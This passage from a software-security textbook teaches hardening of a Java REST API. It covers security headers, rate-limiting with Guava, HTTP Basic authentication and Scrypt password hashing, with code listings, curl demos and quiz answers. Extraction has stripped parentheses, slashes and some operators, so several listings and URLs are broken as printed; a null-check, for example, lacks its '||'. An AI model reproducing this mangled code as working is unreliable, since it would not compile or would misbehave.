filter, which ensures that the headers will get added to error responses as well as normal responses.   Listing  2.11  shows  your  updated  main  method,  incorporating  these  improve- ments.  Locate  the  Main.java  file  under  natter-api src main java com manning  apisecurityinaction and open it in your editor. Add the filters to the main   method below the code that you’ve already written.  Listing 2.11 Hardening your REST endpoints  public static void main String... args  throws Exception {   ..   before   request, response  -> {       if  request.requestMethod  .equals "POST"  &&                      !"application json".equals request.contentType     {         halt 415, new JSONObject  .put                            "error", "Only application json supported"        .toString   ;     }   }  ;    afterAfter  request, response  -> {                         response.type "application json;charset=utf-8" ;     response.header "X-Content-Type-Options", "nosniff" ;     response.header "X-Frame-Options", "DENY" ;     response.header "X-XSS-Protection", "0" ;     response.header "Cache-Control", "no-store" ;     response.header "Content-Security-Policy",         "default-src 'none'; frame-ancestors 'none'; sandbox" ;     response.header "Server", "" ;   } ;  Enforce a correct  Content-Type on  all methods that  receive input in  the request body.  Return a standard 415  Unsupported Media Type  response for invalid  Content-Types.  Collect all your standard  security headers into a  filter that runs after  everything else.    internalServerError new JSONObject         .put "error", "internal server error" .toString   ;   notFound new JSONObject         .put "error", "not found" .toString   ;    exception IllegalArgumentException.class, Main::badRequest ;   exception JSONException.class, Main::badRequest ; }  private static void badRequest Exception ex,     Request request, Response response  {   response.status 400 ;   response.body new JSONObject                    .put "error", ex.getMessage   .toString   ; }  Use a proper JSON  library for all outputs.   60  CHAPTER 2 Secure API development  You should also alter your exceptions to not echo back malformed user input in any case. Although the security headers should prevent any bad effects, it’s best practice not  to  include  user  input  in  error  responses  just  to  be  sure.  It’s  easy  for  a  security header to be accidentally removed, so you should avoid the issue in the first place by returning a more generic error message:      if  !owner.matches "[a-zA-Z][a-zA-Z0-9]{0,29}"   {       throw new IllegalArgumentException "invalid username" ;     }  If you must include user input in error messages, then consider sanitizing it first using a robust library such as the OWASP HTML Sanitizer  https:  github.com OWASP  java-html-sanitizer  or JSON Sanitizer. This will remove a wide variety of potential XSS attack vectors.  Pop quiz 4 Which security header should be used to prevent web browsers from ignoring the  Content-Type header on a response?  a Cache-Control b Content-Security-Policy c X-Frame-Options: deny d X-Content-Type-Options: nosniff e X-XSS-Protection: 1; mode=block  5 Suppose that your API can produce output in either JSON or XML format, accord- ing to the Accept header sent by the client. Which of the following should you not do?  There may be more than one correct answer.  a Set the X-Content-Type-Options header. b c Produce output using a well-tested JSON or XML library. d Ensure the Content-Type is correct on any default error responses. e Copy the Accept header directly to the Content-Type header in the response.

CSRF attacks and defenses are covered in chapter 4.  2 g. Messages from John and all users’ passwords will be returned from the query.

Summary  61  3 b. The attacker can get the program to allocate large byte arrays based on user input. For a Java int value, the maximum would be a 2GB array, which would probably allow the attacker to exhaust all available memory with a few requests. Although passing invalid values is an annoyance, recall from the start of sec- tion 2.5 that Java is a memory-safe language and so these will result in excep- tions rather than insecure behavior.  4 d.

You should never include unsanitized input values in error messages, as this may allow an attacker to inject XSS scripts.

Summary  eterized queries.   SQL injection attacks can be avoided by using prepared statements and param-   Database users should be configured to have the minimum privileges they need to perform their tasks. If the API is ever compromised, this limits the damage that can be done.   Inputs should be validated before use to ensure they match expectations. Regu- lar  expressions  are  a  useful  tool  for  input  validation,  but  you  should  avoid ReDoS attacks.   Even  if  your  API  does  not  produce  HTML  output,  you  should  protect  web browser  clients  from  XSS  attacks  by  ensuring  correct  JSON  is  produced  with correct headers to prevent browsers misinterpreting responses as HTML.   Standard HTTP security headers should be applied to all responses, to ensure that attackers cannot exploit ambiguity in how browsers process results. Make sure to double-check all error responses, as these are often forgotten.   Securing the Natter API  This chapter covers  Authenticating users with HTTP Basic   authentication   Authorizing requests with access control lists  Ensuring accountability through audit logging  Mitigating denial of service attacks with rate-  limiting  In the last chapter you learned how to develop the functionality of your API while avoiding common security flaws. In this chapter you’ll go beyond basic functional- ity and see how proactive security mechanisms can be added to your API to ensure all requests are from genuine users and properly authorized. You’ll protect the Nat- ter API that you developed in chapter 2, applying effective password authentication using Scrypt, locking down communications with HTTPS, and preventing denial of service attacks using the Guava rate-limiting library.     62   Addressing threats with security controls  63  3.1  Addressing threats with security controls You’ll protect the Natter API against common threats by applying some basic security mechanisms   also  known  as  security  controls .  Figure  3.1  shows  the  new  mechanisms that you’ll develop, and you can relate each of them to a STRIDE threat  chapter 1  that they prevent:   Rate-limiting is used to prevent users overwhelming your API with requests, limit-  ing denial of service threats.   Encryption ensures that data is kept confidential when sent to or from the API and when stored on disk, preventing information disclosure. Modern encryp- tion also prevents data being tampered with.   Authentication makes sure that users are who they say they are, preventing spoof- ing. This is essential for accountability, but also a foundation for other security controls.   Audit logging is the basis for accountability, to prevent repudiation threats.   Finally, you’ll apply access control to preserve confidentiality and integrity, pre-  venting information disclosure, tampering and elevation of privilege attacks.  NOTE An important detail, shown in figure 3.1, is that only rate-limiting and access  control  directly  reject  requests.  A  failure  in  authentication  does  not  Rate-limiting rejects requests when the API is overloaded.  Authentication ensures users are who they say they are.

Access control is then applied to  enforce integrity and confidentiality.   64  CHAPTER 3 Securing the Natter API  immediately  cause  a  request  to  fail,  but  a  later  access  control  decision  may reject a request if it is not authenticated. This is important because we want to ensure that even failed requests are logged, which they would not be if the authentication process immediately rejected unauthenticated requests.  Together  these  five  basic  security  controls  address  the  six  basic  STRIDE  threats  of spoofing, tampering, repudiation, information disclosure, denial of service, and eleva- tion of privilege that were discussed in chapter 1. Each security control is discussed and implemented in the rest of this chapter.  3.2  Rate-limiting for availability Threats against availability, such as denial of service  DoS  attacks, can be very difficult to  prevent  entirely.  Such  attacks  are  often  carried  out  using  hijacked  computing resources, allowing an attacker to generate large amounts of traffic with little cost to themselves. Defending against a DoS attack, on the other hand, can require signifi- cant resources, costing time and money. But there are several basic steps you can take to reduce the opportunity for DoS attacks.  DEFINITION A Denial of Service  DoS  attack aims to prevent legitimate users from accessing your API. This can include physical attacks, such as unplug- ging  network  cables,  but  more  often  involves  generating  large  amounts  of traffic to overwhelm your servers. A distributed DoS  DDoS  attack uses many machines  across  the  internet  to  generate  traffic,  making  it  harder  to  block than a single bad client.  Many DoS attacks are caused using unauthenticated requests. One simple way to limit these kinds of attacks is to never let unauthenticated requests consume resources on your servers. Authentication is covered in section 3.3 and should be applied immedi- ately  after  rate-limiting  before  any  other  processing.  However,  authentication  itself can be expensive so this doesn’t eliminate DoS threats on its own.  NOTE Never allow unauthenticated requests to consume significant resources on your server.  Many  DDoS  attacks  rely  on  some  form  of  amplification  so  that  an  unauthenticated request to one API results in a much larger response that can be directed at the real tar- get. A popular example are DNS amplification attacks, which take advantage of the unau- thenticated  Domain  Name  System   DNS   that  maps  host  and  domain  names  into  IP addresses. By spoofing the return address for a DNS query, an attacker can trick  the DNS server into flooding the victim with responses to DNS requests that they never sent. If enough DNS servers can be recruited into the attack, then a very large amount of traffic can be generated from a much smaller amount of request traffic, as shown in figure 3.2. By sending requests from a network of compromised machines  known as a botnet , the attacker can generate very large amounts of traffic to the victim at little cost to  themselves.  DNS  amplification  is  an  example  of  a  network-level  DoS  attack.  These   Rate-limiting for availability  65  DNS server  DNS server  DNS server  Attacker sends small requests to multiple DNS servers, spooﬁng the return IP address.  The DNS servers reply with much larger responses to the victim’s machine.  Attacker  Victim  Figure 3.2 In a DNS amplification attack, the attacker sends the same DNS query to many DNS  servers, spoofing their IP address to look like the request came from the victim. By carefully  choosing the DNS query, the server can be tricked into replying with much more data than was in  the original query, flooding the victim with traffic.  attacks can be mitigated by filtering out harmful traffic entering your network using a firewall. Very large attacks can often only be handled by specialist DoS protection ser- vices provided by companies that have enough network capacity to handle the load.  TIP Amplification  attacks  usually  exploit  weaknesses  in  protocols  based  on UDP  User Datagram Protocol , which are popular in the Internet of Things  IoT . Securing IoT APIs is covered in chapters 12 and 13.  Network-level DoS attacks can be easy to spot because the traffic is unrelated to legiti- mate requests to your API. Application-layer DoS attacks attempt to overwhelm an API by sending valid requests, but at much higher rates than a normal client. A basic defense against application-layer DoS attacks is to apply rate-limiting to all requests, ensuring that you never attempt to process more requests than your server can handle. It is bet- ter to reject some requests in this case, than to crash trying to process everything. Gen- uine clients can retry their requests later when the system has returned to normal.  DEFINITION Application-layer DoS attacks  also known as layer-7 or L7 DoS  send syntactically valid requests to your API but try to overwhelm it by sending a very large volume of requests.  Rate-limiting should be the very first security decision made when a request reaches your  API.  Because  the  goal  of  rate-limiting  is  ensuring  that  your  API  has  enough resources to be able to process accepted requests, you need to ensure that requests that  exceed  your  API’s  capacities  are  rejected  quickly  and  very  early  in  processing. Other security controls, such as authentication, can use significant resources, so rate- limiting must be applied before those processes, as shown in figure 3.3.   66  CHAPTER 3 Securing the Natter API  Request  Web  Mobile  When the rate limit is not exceeded, requests proceed as normal.

Response  Figure 3.3 Rate-limiting rejects requests when your API is under too much load. By rejecting  requests early before they have consumed too many resources, we can ensure that the  requests we do process have enough resources to complete without errors. Rate-limiting  should be the very first decision applied to incoming requests.  TIP You should implement rate-limiting as early as possible, ideally at a load balancer or reverse proxy before requests even reach your API servers. Rate- limiting configuration varies from product to product. See https:  medium .com faun understanding-rate-limiting-on-haproxy-b0cf500310b1 for an exam- ple of configuring rate-limiting for the open source HAProxy load balancer.  3.2.1 Rate-limiting with Guava  Often rate-limiting is applied at a reverse proxy, API gateway, or load balancer before the request reaches the API, so that it can be applied to all requests arriving at a clus- ter of servers. By handling this at a proxy server, you also avoid excess load being gen- erated on your application servers. In this example you’ll apply simple rate-limiting in the API server itself using Google’s Guava library. Even if you enforce rate-limiting at a proxy server, it is good security practice to also enforce rate limits in each server so that if the proxy server misbehaves or is misconfigured, it is still difficult to bring down the individual servers. This is an instance of the general security principle known as defense in depth, which aims to ensure that no failure of a single mechanism is enough to compromise your API.  DEFINITION The principle of defense in depth states that multiple layers of secu- rity defenses should be used so that a failure in any one layer is not enough to breach the security of the whole system.  As you’ll now discover, there are libraries available to make basic rate-limiting very easy to  add  to  your  API,  while  more  complex  requirements  can  be  met  with  off-the-shelf   Rate-limiting for availability  67  proxy gateway products. Open the pom.xml file in your editor and add the following dependency to the dependencies section:                         com.google.guava               guava               29.0-jre             Guava  makes  it  very  simple  to  implement  rate-limiting  using  the  RateLimiter  class that allows us to define the rate of requests per second you want to allow.1 You can then either block and wait until the rate reduces, or you can simply reject the request as we do in the next listing. The standard HTTP 429 Too Many Requests status code2 can be used to indicate that rate-limiting has been applied and that the client should try the request again later. You can also send a Retry-After header to indicate how many seconds the client should wait before trying again. Set a low limit of 2 requests per second to make it easy to see it in action. The rate limiter should be the very first filter defined in your main method, because even authentication and audit logging may consume resources.  TIP The rate limit for individual servers should be a fraction of the overall rate limit you want your service to handle. If your service needs to handle a thousand requests per second, and you have 10 servers, then the per-server rate limit should be around 100 request per second. You should verify that each server is able to handle this maximum rate.  Open the Main.java file in your editor and add an import for Guava to the top of the file:  import com.google.common.util.concurrent.*;  Then, in the main method, after initializing the database and constructing the control- ler objects, add the code in the listing 3.1 to create the RateLimiter object and add a filter  to  reject  any  requests  once  the  rate  limit  has  been  exceeded.  We  use  the  non- blocking tryAcquire   method that returns false if the request should be rejected.  Listing 3.1 Applying rate-limiting with Guava    var rateLimiter = RateLimiter.create 2.0d ;         before  request, response  -> {     if  !rateLimiter.tryAcquire    {             Create the shared rate  limiter object and allow just  2 API requests per second.  Check if the rate has  been exceeded.  1 The RateLimiter class is marked as unstable in Guava, so it may change in future versions. 2 Some services return a 503 Service Unavailable status instead. Either is acceptable, but 429 is more accurate,  especially if you perform per-client rate-limiting.   68  CHAPTER 3 Securing the Natter API        response.header "Retry-After", "2" ;           halt 429 ;          }   } ;  Return a 429 Too  Many Requests  status.  If so, add a Retry-After  header indicating when  the client should retry.  Guava’s rate limiter is quite basic, defining only a simple requests per second rate. It has additional features, such as being able to consume more permits for more expen- sive API operations. It lacks more advanced features, such as being able to cope with occasional bursts of activity, but it’s perfectly fine as a basic defensive measure that can be incorporated into an API in a few lines of code. You can try it out on the command line to see it in action:  $ for i in {1..5} > do >   curl -i -d "{\"owner\":\"test\",\"name\":\"space$i\"}"  ➥ -H ‘Content-Type: application json’  ➥ http:  localhost:4567 spaces; > done HTTP 1.1 201 Created       Date: Wed, 06 Feb 2019 21:07:21 GMT Location:  spaces 1 Content-Type: application json;charset=utf-8 X-Content-Type-Options: nosniff X-Frame-Options: DENY X-XSS-Protection: 0 Cache-Control: no-store Content-Security-Policy: default-src ‘none’; frame-ancestors ‘none’; sandbox Server:  Transfer-Encoding: chunked  HTTP 1.1 201 Created       Date: Wed, 06 Feb 2019 21:07:21 GMT Location:  spaces 2 Content-Type: application json;charset=utf-8 X-Content-Type-Options: nosniff X-Frame-Options: DENY X-XSS-Protection: 0 Cache-Control: no-store Content-Security-Policy: default-src ‘none’; frame-ancestors ‘none’; sandbox Server:  Transfer-Encoding: chunked  HTTP 1.1 201 Created       Date: Wed, 06 Feb 2019 21:07:22 GMT Location:  spaces 3 Content-Type: application json;charset=utf-8 X-Content-Type-Options: nosniff X-Frame-Options: DENY X-XSS-Protection: 0 Cache-Control: no-store Content-Security-Policy: default-src ‘none’; frame-ancestors ‘none’; sandbox Server:  Transfer-Encoding: chunked  The first requests succeed while the rate limit is not exceeded.

By returning a 429 response immediately, you can limit the amount of work that your API is performing to the bare minimum, allowing it to use those resources for serving the requests that it can handle. The rate  limit should always be set below what you think your servers can handle, to give some wiggle room.  Pop quiz 1 Which one of the following statements is true about rate-limiting?  a Rate-limiting should occur after access control. b Rate-limiting stops all denial of service attacks. c Rate-limiting should be enforced as early as possible. d Rate-limiting is only needed for APIs that have a lot of clients.  2 Which HTTP response header can be used to indicate how long a client should  wait before sending any more requests? a Expires b Retry-After c Last-Modified d Content-Security-Policy e Access-Control-Max-Age  The answers are at the end of the chapter.   70  3.3  CHAPTER 3 Securing the Natter API  Authentication to prevent spoofing Almost all operations in our API need to know who is performing them.

Instead, we rely on people to tell us who they are. But what if they are not honest? For a social app, users may be able to impersonate each other to spread rumors and cause friends to fall out. For a banking API, it would be catastrophic if users can easily pretend to be some- body else and spend their money. Almost all security starts with authentication, which is the process of verifying that a user is who they say they are.   Figure 3.4 shows how authentication fits within the security controls that you’ll add to the API in this chapter. Apart from rate-limiting  which is applied to all requests regardless  of  who  they  come  from ,  authentication  is  the  first  process  we  perform. Downstream  security  controls,  such  as  audit  logging  and  access  control,  will  almost always need to know who the user is. It is important to realize that the authentication phase itself shouldn’t reject a request even if authentication fails. Deciding whether any particular request requires the user to be authenticated is the job of access control  covered later in this chapter , and your API may allow some requests to be carried out anonymously. Instead, the authentication process will populate the request with attributes indicating whether the user was correctly authenticated that can be used by these downstream processes.  Web browser  Mobile app  All requests proceed, even if authentication was not successful, to ensure they are logged.

Figure 3.4 Authentication occurs after rate-limiting but before audit logging or access  control. All requests proceed, even if authentication fails, to ensure that they are always  logged. Unauthenticated requests will be rejected during access control, which occurs after  audit logging.   3.3.1 HTTP Basic authentication  Authentication to prevent spoofing  71  In the Natter API, a user makes a claim of identity in two places:  1  2  In the Create Space operation, the request includes an “owner” field that iden- tifies the user creating the space. In the Post Message operation, the user identifies themselves in the “author” field.  The operations to read messages currently don’t identify who is asking for those mes- sages at all, meaning that we can’t tell if they should have access. You’ll correct both problems by introducing authentication.  There are many ways of authenticating a user, but one of the most widespread is sim- ple username and password authentication. In a web application with a user interface, we might implement this by presenting the user with a form to enter their username and password. An API is not responsible for rendering a UI, so you can instead use the standard HTTP Basic authentication mechanism to prompt for a password in a way that doesn’t depend on any UI. This is a simple standard scheme, specified in RFC 7617  https:  tools.ietf.org html rfc7617 , in which the username and password are encoded  using Base64 encoding; https:  en.wikipedia.org wiki Base64  and sent in a header. An example of a Basic authentication header for the username demo and password changeit is as follows:  Authorization: Basic ZGVtbzpjaGFuZ2VpdA==  The Authorization header is a standard HTTP header for sending credentials to the server.  It’s  extensible,  allowing  different  authentication  schemes,3  but  in  this  case you’re  using  the  Basic  scheme.  The  credentials  follow  the  authentication  scheme identifier. For Basic authentication, these consist of a string of the username followed by a colon4 and then the password. The string is then converted into bytes  usually in UTF-8, but the standard does not specify  and Base64-encoded, which you can see if you decode it in jshell:  jshell> new String  java.util.Base64.getDecoder  .decode "ZGVtbzpjaGFuZ2VpdA==" , "UTF-8"  $3 ==> "demo:changeit"  WARNING HTTP  Basic  credentials  are  easy  to  decode  for  anybody  able  to read  network  messages  between  the  client  and  the  server.  You  should  only ever send passwords over an encrypted connection. You’ll add encryption to the API communications in section 3.4.  3 The HTTP specifications unfortunately confuse the terms  authentication and authorization. As you’ll see in  chapter 9, there are authorization schemes that do not involve authentication.  4 The username is not allowed to contain a colon.   72  3.3.2  CHAPTER 3 Securing the Natter API  Secure password storage with Scrypt Web browsers have built-in support for HTTP Basic authentication  albeit with some quirks that you’ll see later , as does curl and many other command-line tools. This allows us to easily send a username and password to the API, but you need to securely store and validate that password. A password hashing algorithm converts each password into a fixed-length random-looking string. When the user tries to login, the password they present is hashed using the same algorithm and compared to the hash stored in the database. This allows the password to be checked without storing it directly. Mod- ern  password  hashing  algorithms,  such  as  Argon2,  Scrypt,  Bcrypt,  or  PBKDF2,  are designed to resist a variety of attacks in case the hashed passwords are ever stolen. In particular, they are designed to take a lot of time or memory to process to prevent brute-force  attacks  to  recover  the  passwords.  You’ll  use  Scrypt  in  this  chapter  as  it  is secure and widely implemented.  DEFINITION A  password  hashing  algorithm  converts  passwords  into  random- looking fixed-size values known as a hash. A secure password hash uses a lot of time and memory to slow down brute-force attacks such as dictionary attacks, in which an  attacker  tries  a  list  of  common  passwords to  see  if  any  match the hash.  Locate the pom.xml file in the project and open it with your favorite editor. Add the following Scrypt dependency to the dependencies section and then save the file:                         com.lambdaworks               scrypt               1.4.0             TIP You  may  be  able  to  avoid  implementing  password  storage  yourself  by using an LDAP  Lightweight Directory Access Protocol  directory. LDAP serv- ers often implement a range of secure password storage options. You can also outsource  authentication  to  another  organization  using  a  federation  protocol like SAML or OpenID Connect. OpenID Connect is discussed in chapter 7.  3.3.3  Creating the password database  Before you can authenticate any users, you need some way to register them. For now, you’ll  just  allow  any  user  to  register  by  making  a  POST  request  to  the  users  end- point, specifying their username and chosen password. You’ll add this endpoint in sec- tion 3.3.4, but first let’s see how to store user passwords securely in the database.  TIP In a real project, you could confirm the user’s identity during registra- tion   by  sending  them  an  email  or  validating  their  credit  card,  for  exam- ple ,  or  you  might  use  an  existing  user  repository  and  not  allow  users  to self-register.    Authentication to prevent spoofing  73  You’ll  store  users  in  a  new  dedicated  database  table,  which  you  need  to  add  to  the database  schema.  Open  the  schema.sql  file  under  src main resources  in  your  text editor, and add the following table definition at the top of the file and save it:  CREATE TABLE users      user_id VARCHAR 30  PRIMARY KEY,     pw_hash VARCHAR 255  NOT NULL  ;  You also need to grant the natter_api_user permissions to read and insert into this table, so add the following line to the end of the schema.sql file and save it again:  GRANT SELECT, INSERT ON users TO natter_api_user;  The table just contains the user id and their password hash. To store a new user, you calculate  the  hash  of  their  password  and  store  that  in  the  pw_hash  column.  In  this example, you’ll use the Scrypt library to hash the password and then use Dalesbred to insert the hashed value into the database.   Scrypt takes several parameters to tune the amount of time and memory that it will use. You do not need to understand these numbers, just know that larger num- bers will use more CPU time and memory. You can use the recommended parame- ters as of 2019  see https:  blog.filippo.io the-scrypt-parameters  for a discussion of Scrypt  parameters ,  which  should  take  around  100ms  on  a  single  CPU  and  32MiB of memory:      String hash = SCryptUtil.scrypt password, 32768, 8, 1 ;  This may seem an excessive amount of time and memory, but these parameters have been  carefully  chosen  based  on  the  speed  at  which  attackers  can  guess  passwords. Dedicated  password  cracking  machines,  which  can  be  built  for  relatively  modest amounts of money, can try many millions or even billions of passwords per second. The expensive time and memory requirements of secure password hashing algorithms such as Scrypt reduce this to a few thousand passwords per second, hugely increasing the cost for the attacker and giving users valuable time to change their passwords after a breach is discovered. The latest NIST guidance on secure password storage  “memo- rized  secret  verifiers”  in  the  tortured  language  of  NIST   recommends  using  strong memory-hard  hash  functions  such  as  Scrypt   https:  pages.nist.gov 800-63-3 sp800- 63b.htmlmemsecret .    If you have particularly strict requirements on the performance of authentica- tion to your system, then you can adjust the Scrypt parameters to reduce the time and memory requirements to fit your needs. But you should aim to use the recom- mended secure defaults until you know that they are causing an adverse impact on performance.  You  should  consider  using  other  authentication  methods  if  secure password processing is too expensive for your application. Although there are pro- tocols  that  allow  offloading  the  cost  of  password  hashing  to  the  client,  such  as   74  CHAPTER 3 Securing the Natter API  SCRAM5 or OPAQUE,6 this is hard to do securely so you should consult an expert before implementing such a solution.  PRINCIPLE Establish  secure  defaults  for  all  security-sensitive  algorithms  and parameters used in your API. Only relax the values if there is no other way to achieve your non-security requirements.  3.3.4 Registering users in the Natter API  Listing 3.2 shows a new UserController class with a method for registering a user:   First, you read the username and password from the input, making sure to vali-  date them both as you learned in chapter 2.   Then you calculate a fresh Scrypt hash of the password.   Finally, store the username and hash together in the database, using a prepared  statement to avoid SQL injection attacks.   Navigate  to  the  folder  src main java com manning apisecurityinaction controller in your editor and create a new file UserController.java. Copy the contents of the list- ing into the editor and save the new file.  Listing 3.2 Registering a new user  package com.manning.apisecurityinaction.controller;  import com.lambdaworks.crypto.*; import org.dalesbred.*; import org.json.*; import spark.*;  import java.nio.charset.*; import java.util.*;  import static spark.Spark.*;  public class UserController {   private static final String USERNAME_PATTERN =       "[a-zA-Z][a-zA-Z0-9]{1,29}";    private final Database database;    public UserController Database database  {     this.database = database;   }    public JSONObject registerUser Request request,       Response response  throws Exception {     var json = new JSONObject request.body   ;  5 https:  tools.ietf.org html rfc5802 6 https:  blog.cryptographyengineering.com 2018 10 19 lets-talk-about-pake    Authentication to prevent spoofing  75      var username = json.getString "username" ;     var password = json.getString "password" ;      if  !username.matches USERNAME_PATTERN   {          throw new IllegalArgumentException "invalid username" ;     }     if  password.length   < 8  {       throw new IllegalArgumentException            "password must be at least 8 characters" ;     }  Apply the same  username validation  that you used before.      var hash = SCryptUtil.scrypt password, 32768, 8, 1 ;         database.updateUnique                                    "INSERT INTO users user_id, pw_hash " +         " VALUES ?, ? ", username, hash ;  Use a prepared statement  to insert the username  and hash.  Use the Scrypt library  to hash the password.  Use the recommended  parameters for 2019.      response.status 201 ;     response.header "Location", " users " + username ;     return new JSONObject  .put "username", username ;   } }  The Scrypt library generates a unique random salt value for each password hash. The hash string that gets stored in the database includes the parameters that were used when the hash was generated, as well as this random salt value. This ensures that you can always recreate the same hash in future, even if you change the parameters. The Scrypt library will be able to read this value and decode the parameters when it veri- fies the hash.  DEFINITION A salt is a random value that is mixed into the password when it is hashed. Salts ensure that the hash is always different even if two users have the same password. Without salts, an attacker can build a compressed database of common password hashes, known as a rainbow table, which allows passwords to be recovered very quickly.  You can then add a new route for registering a new user to your Main class. Locate the Main.java file in your editor and add the following lines just below where you previ- ously created the SpaceController object:  var userController = new UserController database ; post " users", userController::registerUser ;  3.3.5  Authenticating users To  authenticate  a  user,  you’ll  extract  the  username  and  password  from  the  HTTP Basic  authentication  header,  look  up  the  corresponding  user  in  the  database,  and finally verify the password matches the hash stored for that user. Behind the scenes, the Scrypt library will extract the salt from the stored password hash, then hash the sup- plied password with the same salt and parameters, and then finally compare the hashed   76  CHAPTER 3 Securing the Natter API  password with the stored hash. If they match, then the user must have presented the same password and so authentication succeeds, otherwise it fails.    Listing 3.3 implements this check as a filter that is called before every API call. First you check if there is an Authorization header in the request, with the Basic authenti- cation scheme. Then, if it is present, you can extract and decode the Base64-encoded credentials. Validate the username as always and look up the user from the database. Finally,  use  the  Scrypt  library  to  check  whether  the  supplied  password  matches  the hash stored for the user in the database. If authentication succeeds, then you should store the username in an attribute on the request so that other handlers can see it; otherwise, leave it as null to indicate an unauthenticated user. Open the UserController .java file that you previously created and add the authenticate method as given in the listing.  Listing 3.3 Authenticating a request  public void authenticate Request request, Response response  {   var authHeader = request.headers "Authorization" ;                if  authHeader == null  !authHeader.startsWith "Basic "   {       return;                                                         }                                                                Check to see if there  is an HTTP Basic  Authorization  header.    var offset = "Basic ".length  ;   var credentials = new String Base64.getDecoder  .decode              authHeader.substring offset  , StandardCharsets.UTF_8 ;     Decode the  credentials using  Base64 and UTF-8.    var components = credentials.split ":", 2 ;                     if  components.length != 2  {                                     throw new IllegalArgumentException "invalid auth header" ;    }                                                                var username = components[0];                                   var password = components[1];                                  Split the credentials  into username and  password.    if  !username.matches USERNAME_PATTERN   {     throw new IllegalArgumentException "invalid username" ;   }    var hash = database.findOptional String.class,       "SELECT pw_hash FROM users WHERE user_id = ?", username ;    if  hash.isPresent   &&                               SCryptUtil.check password, hash.get     {       request.attribute "subject", username ;   } }  If the user exists,  then use the Scrypt  library to check  the password.  You  can  wire  this  into  the  Main  class  as  a  filter  in  front  of  all  API  calls.  Open  the Main.java file in your text editor again, and add the following line to the main method underneath where you created the userController object:      before userController::authenticate ;   Authentication to prevent spoofing  77  You can now update your API methods to check that the authenticated user matches any claimed identity in the request. For example, you can update the Create Space operation to check that the owner field matches the currently authenticated user. This also allows you to skip validating the username, because you can rely on the authenti- cation service to have done that already. Open the SpaceController.java file in your editor  and  change  the  createSpace  method  to  check  that  the  owner  of  the  space matches the authenticated subject, as in the following snippet:    public JSONObject createSpace Request request, Response response  {     ..     var owner = json.getString "owner" ;     var subject = request.attribute "subject" ;     if  !owner.equals subject   {       throw new IllegalArgumentException            "owner must match authenticated user" ;     }     ..   }  You could in fact remove the owner field from the request and always use the authen- ticated user subject, but for now you’ll leave it as-is. You can do the same in the Post Message operation in the same file:      var user = json.getString "author" ;     if  !user.equals request.attribute "subject"    {       throw new IllegalArgumentException            "author must match authenticated user" ;     }  You’ve  now  enabled  authentication  for  your  API—every  time  a  user  makes  a  claim about their identity, they are required to authenticate to provide proof of that claim. You’re not yet enforcing authentication on all API calls, so you can still read messages without being authenticated. You’ll tackle that shortly when you look at access control. The checks we have added so far are part of the application logic. Now let’s try out how the API works. First, let’s try creating a space without authenticating:  $ curl -d '{"name":"test space","owner":"demo"}'  ➥ -H 'Content-Type: application json' http:  localhost:4567 spaces  {"error":"owner must match authenticated user"}  Good, that was prevented. Let’s use curl now to register a demo user:  $ curl -d '{"username":"demo","password":"password"}’'  ➥ -H 'Content-Type: application json' http:  localhost:4567 users  {"username":"demo"}   78  CHAPTER 3 Securing the Natter API  Finally,  you  can  repeat  your  Create  Space  request  with  correct  authentication credentials:  $ curl -u demo:password -d '{"name":"test space","owner":"demo"}'  ➥ -H 'Content-Type: application json' http:  localhost:4567 spaces  {"name":"test space","uri":" spaces 1"}  Pop quiz 3 Which  of  the  following  are  desirable  properties  of  a  secure  password  hashing  algorithm?  There may be several correct answers.   a  b  c  d  e  f  It should be easy to parallelize. It should use a lot of storage on disk. It should use a lot of network bandwidth. It should use a lot of memory  several MB . It should use a random salt for each password. It should use a lot of CPU power to try lots of passwords.  4 What is the main reason why HTTP Basic authentication should only be used over an  encrypted communication channel such as HTTPS?  Choose one answer.  a The password can be exposed in the Referer header. b HTTPS slows down attackers trying to guess passwords. c The password might be tampered with during transmission. d Google penalizes websites in search rankings if they do not use HTTPS. e The password can easily be decoded by anybody snooping on network traffic.  The answers are at the end of the chapter.  3.4  Using encryption to keep data private Introducing authentication into your API protects against spoofing threats. However, requests to the API, and responses from it, are not protected in any way, leading to tampering and information disclosure threats. Imagine that you were trying to check the latest gossip from your work party while connected to a public wifi hotspot in your local coffee shop. Without encryption, the messages you send to and from the API will be readable by anybody else connected to the same hotspot.   Your simple password authentication scheme is also vulnerable to this snooping, as an  attacker  with  access  to  the  network  can  simply  read  your  Base64-encoded  pass- words as they go by. They can then impersonate any user whose password they have stolen. It’s often the case that threats are linked together in this way. An attacker can take advantage of one threat, in this case information disclosure from unencrypted communications, and exploit that to pretend to be somebody else, undermining your API’s authentication. Many successful real-world attacks result from chaining together multiple vulnerabilities rather than exploiting just one mistake.   Using encryption to keep data private  79   In this case, sending passwords in clear text is a pretty big vulnerability, so let’s fix that  by  enabling  HTTPS.  HTTPS  is  normal  HTTP,  but  the  connection  occurs  over Transport Layer Security  TLS , which provides encryption and integrity protection. Once correctly configured, TLS is largely transparent to the API because it occurs at a lower level in the protocol stack and the API still sees normal requests and responses. Figure 3.5 shows how HTTPS fits into the picture, protecting the connections between your users and the API.  Inside your API, requests and responses are unencrypted.  Request  Web browser  Mobile app  R a  t  e - l i  m  i t i  n g  A u  t  h e n  t i c a  t i  o n  A u d  i t   l  o g  A c c e s s   c o n  t r o  l  Natter API  Application  logic  Response  HTTPS is used to encrypt and protect data being transmitted  in transit  to and from your API.  Encryption should also be used to protect sensitive data at rest in your application database.  Application  database  Figure 3.5 Encryption is used to protect data in transit between a client and our API, and at  rest when stored in the database.  In addition to protecting data in transit  on the way to and from our application , you should  also  consider  protecting  any  sensitive  data  at  rest,  when  it  is  stored  in  your application’s database. Many different people may have access to the database, as a legitimate part of their job, or due to gaining illegitimate access to it through some other vulnerability. For this reason, you should also consider encrypting private data in the database, as shown in figure 3.5. In this chapter, we will focus on protecting data in transit with HTTPS and discuss encrypting data in the database in chapter 5.  TLS or SSL? Transport Layer Security  TLS  is a protocol that sits on top of TCP IP and provides several basic security functions to allow secure communication between a client and a server. Early versions of TLS were known as the Secure Socket Layer, or SSL, and you’ll often still hear TLS referred to as SSL. Application protocols that use TLS often have an S appended to their name, for example HTTPS or LDAPS, to stand for “secure.”   80  CHAPTER 3 Securing the Natter API  3.4.1   continued  TLS ensures confidentiality and integrity of data transmitted between the client and server. It does this by encrypting and authenticating all data flowing between the two parties. The first time a client connects to a server, a TLS handshake is performed in which the server authenticates to the client, to guarantee that the client connected to the server it wanted to connect to  and not to a server under an attacker’s control . Then fresh cryptographic keys are negotiated for this session and used to encrypt and authenticate every request and response from then on. You’ll look in depth at TLS and HTTPS in chapter 7.  Enabling HTTPS Enabling HTTPS support in Spark is 